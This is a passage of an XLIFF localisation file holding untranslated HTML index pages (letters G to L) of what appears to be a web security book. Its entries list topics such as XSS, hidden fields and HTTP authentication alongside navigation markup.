										[&lt;a class="v1" href="index&amp;amp;view=U.html"&gt;U&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=V.html"&gt;V&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=W.html"&gt;W&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=X.html"&gt;X&lt;/a&gt;]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="app01lev1sec6.html#iddle1273"&gt; Gates, Bill&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch04lev1sec2.html#iddle1274"&gt; GET versus POST&lt;/a&gt;&lt;br /&gt;Google&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch04lev1sec2.html#iddle1275"&gt; CGI parameters&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1276"&gt; operators&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1277"&gt; query strings&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch05lev1sec2.html#iddle1278"&gt; XSS&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec3.html#iddle1279"&gt; gopher&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch03lev1sec2.html#iddle1280"&gt; graphical user interfaces (GUIs)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1281"&gt; grep&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch02lev1sec2.html#iddle1282"&gt; guessing files and directories&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch02lev1sec2.html#iddle1283"&gt; applying this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch02lev1sec2.html#iddle1284"&gt; conducting this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch02lev1sec2.html#iddle1285"&gt; protecting against this attack&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app02.html#iddle1286"&gt; guestbook.php&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch03lev1sec2.html#iddle1287"&gt; GUIs (graphical user interfaces)&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=F.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="index&amp;view=H.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=G.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>[&lt;a class="v1" href="index&amp;amp;view=SYMBOL.html"&gt;SYMBOL&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=A.html"&gt;A&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=B.html"&gt;B&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=C.html"&gt;C&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=D.html"&gt;D&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=E.html"&gt;E&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=F.html"&gt;F&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=G.html"&gt;G&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=H.html" style="font-weight:bold;"&gt;H&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=I.html"&gt;I&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=K.html"&gt;K&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=L.html"&gt;L&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=M.html"&gt;M&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=N.html"&gt;N&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=O.html"&gt;O&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=P.html"&gt;P&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=Q.html"&gt;Q&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=R.html"&gt;R&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=S.html"&gt;S&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=T.html"&gt;T&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=U.html"&gt;U&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=V.html"&gt;V&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=W.html"&gt;W&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=X.html"&gt;X&lt;/a&gt;]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="app01lev1sec6.html#iddle1288"&gt; Hatton, Les&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1289"&gt; headers, server headers&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app02.html#iddle1290"&gt; hidden field manipulation/directory traversal, search.php&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch03lev1sec2.html#iddle1291"&gt; hidden fields&lt;/a&gt;&lt;a class="v2" href="ch04lev1sec2.html#iddle1292"&gt; 2nd&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch04lev1sec2.html#iddle1293"&gt; applying this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch04lev1sec2.html#iddle1294"&gt; DOM&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch04lev1sec2.html#iddle1295"&gt; performing this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch04lev1sec2.html#iddle1296"&gt; protecting against this attack&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1297"&gt; hidden input fields&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1298"&gt; hiding control pages&lt;/a&gt;&lt;br /&gt;history of computers&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app01lev1sec1.html#iddle1299"&gt; 1950 to 1959&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app01lev1sec2.html#iddle1300"&gt; 1960 to 1969&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app01lev1sec3.html#iddle1301"&gt; 1970 to 1979&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app01lev1sec3.html#iddle1302"&gt; 1980 to 1989&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app01lev1sec3.html#iddle1303"&gt; CASE&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app01lev1sec4.html#iddle1304"&gt; formal methods&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app01lev1sec5.html#iddle1305"&gt; 1990 to 1999&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app01lev1sec6.html#iddle1306"&gt; 2000 to 2009&lt;/a&gt;&lt;br /&gt;holes left by other people attacks&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch02lev1sec2.html#iddle1307"&gt; applying this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch02lev1sec2.html#iddle1308"&gt; conducting this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch02lev1sec2.html#iddle1309"&gt; protecting against this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch02lev1sec2.html#iddle1310"&gt; reusing code&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch04lev1sec1.html#iddle1311"&gt; home pages&lt;/a&gt;&lt;br /&gt;HTML&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;  &lt;a class="v2" href="ch02lev1sec2.html#iddle1312"&gt; comments&lt;/a&gt;&lt;a class="v2" href="ch02lev1sec2.html#iddle1313"&gt; 2nd&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec3.html#iddle1314"&gt; XML versus&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec3.html#iddle1315"&gt; HTML developers&lt;/a&gt;&lt;br /&gt;HTTP (HyperText Transfer Protocol)&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch08lev1sec2.html#iddle1316"&gt; fake cryptography&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;  &lt;a class="v2" href="ch08lev1sec2.html#iddle1317"&gt; TRACE&lt;/a&gt;&lt;a class="v2" href="ch08lev1sec2.html#iddle1318"&gt; 2nd&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1319"&gt; HTTP authentication&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch05lev1sec2.html#iddle1320"&gt; HTTP-ONLY&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch04lev1sec2.html#iddle1321"&gt; HTTP-REFERER&lt;/a&gt;&lt;a class="v2" href="ch04lev1sec2.html#iddle1322"&gt; 2nd&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1323"&gt; HTTPrint&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec6.html#iddle1324"&gt; HTTPS (HyperText Transfer Protocol over Secure Sockets)&lt;/a&gt;&lt;a class="v2" href="ch08lev1sec2.html#iddle1325"&gt; 2nd&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch04lev1sec1.html#iddle1326"&gt; hyperlinks&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=G.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="index&amp;view=I.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=H.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>[&lt;a class="v1" href="index&amp;amp;view=SYMBOL.html"&gt;SYMBOL&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=A.html"&gt;A&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=B.html"&gt;B&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=C.html"&gt;C&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=D.html"&gt;D&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=E.html"&gt;E&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=F.html"&gt;F&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=G.html"&gt;G&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=H.html"&gt;H&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=I.html" style="font-weight:bold;"&gt;I&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=K.html"&gt;K&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=L.html"&gt;L&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=M.html"&gt;M&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=N.html"&gt;N&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=O.html"&gt;O&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=P.html"&gt;P&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=Q.html"&gt;Q&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=R.html"&gt;R&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=S.html"&gt;S&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=T.html"&gt;T&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=U.html"&gt;U&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=V.html"&gt;V&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=W.html"&gt;W&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=X.html"&gt;X&lt;/a&gt;]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch02lev1sec2.html#iddle1327"&gt; iDefence, session ID auditor&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch04lev1sec2.html#iddle1328"&gt; idempotent operations&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1329"&gt; identifying third-party components&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app01lev1sec6.html#iddle1330"&gt; IF statements&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch09lev1sec5.html#iddle1331"&gt; images, Web bugs&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app01lev1sec6.html#iddle1332"&gt; information hiding&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch05lev1sec1.html#iddle1333"&gt; input data&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1334"&gt; input fields, hidden input fields&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch03lev1sec2.html#iddle1335"&gt; input validation&lt;/a&gt;&lt;a class="v2" href="ch03lev1sec2.html#iddle1336"&gt; 2nd&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1337"&gt; integrity&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1338"&gt; Intentia International&lt;/a&gt;&lt;a class="v2" href="ch05lev1sec2.html#iddle1339"&gt; 2nd&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch03lev1sec2.html#iddle1340"&gt; Internet Explorer&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;  &lt;a class="v2" href="ch04lev1sec2.html#iddle1341"&gt; cookies&lt;/a&gt;&lt;a class="v2" href="ch04lev1sec2.html#iddle1342"&gt; 2nd&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec2.html#iddle1343"&gt; IP (Internet Protocol)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1344"&gt; IP addresses&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=H.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="index&amp;view=K.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=I.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>[&lt;a class="v1" href="index&amp;amp;view=SYMBOL.html"&gt;SYMBOL&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=A.html"&gt;A&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=B.html"&gt;B&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=C.html"&gt;C&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=D.html"&gt;D&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=E.html"&gt;E&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=F.html"&gt;F&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=G.html"&gt;G&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=H.html"&gt;H&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=I.html"&gt;I&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=K.html" style="font-weight:bold;"&gt;K&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=L.html"&gt;L&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=M.html"&gt;M&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=N.html"&gt;N&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=O.html"&gt;O&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=P.html"&gt;P&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=Q.html"&gt;Q&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=R.html"&gt;R&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=S.html"&gt;S&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=T.html"&gt;T&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=U.html"&gt;U&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=V.html"&gt;V&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=W.html"&gt;W&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=X.html"&gt;X&lt;/a&gt;]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch07lev1sec2.html#iddle1345"&gt; keywords, EXEC&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app01lev1sec6.html#iddle1346"&gt; KLOC&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=I.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="index&amp;view=L.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=K.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>[&lt;a class="v1" href="index&amp;amp;view=SYMBOL.html"&gt;SYMBOL&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=A.html"&gt;A&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=B.html"&gt;B&lt;/a&gt;]
									
